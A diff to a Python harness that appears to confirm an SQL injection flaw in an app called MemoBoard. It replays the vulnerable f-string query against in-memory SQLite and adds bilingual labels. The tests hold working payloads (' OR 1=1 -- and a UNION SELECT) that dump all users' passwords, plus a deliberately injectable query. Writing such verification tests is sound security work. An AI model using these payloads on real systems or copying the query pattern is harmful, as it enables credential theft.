@@ -4,7 +4,24 @@
 Replicates the vulnerable f-string SQL construction and executes it against
 an in-memory SQLite database with the same schema and seed data as the app.
 """
+import argparse
 import sqlite3
+
+MSGS = {
+    "t1": ("=== Test 1: Normal query (name=alice) ===", "=== 测试 1：正常查询（name=alice）==="),
+    "t2": (
+        "=== Test 2: SQL injection payload: ' OR 1=1 -- ===",
+        "=== 测试 2：SQL 注入载荷：' OR 1=1 -- ===",
+    ),
+    "records": ("Records returned:", "返回记录数:"),
+    "t3": ("=== Test 3: UNION-based injection ===", "=== 测试 3：UNION 注入 ==="),
+    "t4": ("=== Test 4: Constructed SQL ===", "=== 测试 4：构造出的 SQL ==="),
+}
+
+
+def msg(key: str, zh: bool) -> str:
+    en, zh_s = MSGS[key]
+    return zh_s if zh else en
 
 
 def run_user_lookup(name: str, conn) -> list[dict]:
@@ -15,9 +32,15 @@ def run_user_lookup(name: str, conn) -> list[dict]:
 
 
 def main() -> int:
+    p = argparse.ArgumentParser(description="MemoBoard SQLi harness")
+    p.add_argument("--zh", action="store_true", help="Print labels in Chinese (default: English)")
+    args = p.parse_args()
+    zh = args.zh
+
     conn = sqlite3.connect(":memory:")
     conn.row_factory = sqlite3.Row
-    conn.executescript("""
+    conn.executescript(
+        """
         CREATE TABLE IF NOT EXISTS users (
             id INTEGER PRIMARY KEY,
             name TEXT NOT NULL,
@@ -25,7 +48,8 @@ def main() -> int:
             role TEXT NOT NULL,
             email TEXT NOT NULL
         );
-    """)
+        """
+    )
     conn.executemany(
         "INSERT INTO users(name, password, role, email) VALUES (?, ?, ?, ?)",
         [
@@ -36,36 +60,33 @@ def main() -> int:
     )
     conn.commit()
 
-    # Test 1: Normal query
-    print("=== Test 1: Normal query (name=alice) ===")
+    print(msg("t1", zh))
     result = run_user_lookup("alice", conn)
+    print(result)
     assert len(result) == 1 and result[0]["name"] == "alice"
-    print(f"PASS: returns {result[0]['name']}\n")
 
-    # Test 2: SQL injection ' OR 1=1 --
-    print("=== Test 2: SQL injection payload: ' OR 1=1 -- ===")
-    result = run_user_lookup("' OR 1=1 --", conn)
-    print(f"Records returned: {len(result)}")
-    for r in result:
-        print(f"  name={r['name']}, password={r['password']}, role={r['role']}")
-    assert len(result) == 3
-    admin = [r for r in result if r["role"] == "admin"]
+    print(msg("t2", zh))
+    injected = run_user_lookup("' OR 1=1 --", conn)
+    print(msg("records", zh), len(injected))
+    for row in injected:
+        print(f"  name={row['name']}, password={row['password']}, role={row['role']}")
+    assert len(injected) == 3
+    admin = [r for r in injected if r["role"] == "admin"]
     assert len(admin) == 1 and admin[0]["password"] == "admin123"
-    print("PASS: all users including admin password leaked\n")
 
-    # Test 3: UNION injection
-    print("=== Test 3: UNION-based injection ===")
-    result = run_user_lookup("' UNION SELECT id, name, role, email, password FROM users --", conn)
-    assert len(result) >= 3
-    print(f"PASS: {len(result)} records via UNION\n")
+    print(msg("t3", zh))
+    union_rows = run_user_lookup(
+        "' UNION SELECT id, name, role, email, password FROM users --",
+        conn,
+    )
+    print(union_rows)
+    assert len(union_rows) >= 3
 
-    # Test 4: Constructed SQL string
     payload = "' OR 1=1 --"
     sql = f"SELECT id, name, role, email, password FROM users WHERE name = '{payload}'"
-    print(f"=== Test 4: Constructed SQL ===\n{sql}")
-    print("PASS: valid injectable SQL\n")
+    print(msg("t4", zh))
+    print(sql)
 
-    print("=== ALL TESTS PASSED ===")
     conn.close()
     return 0
 
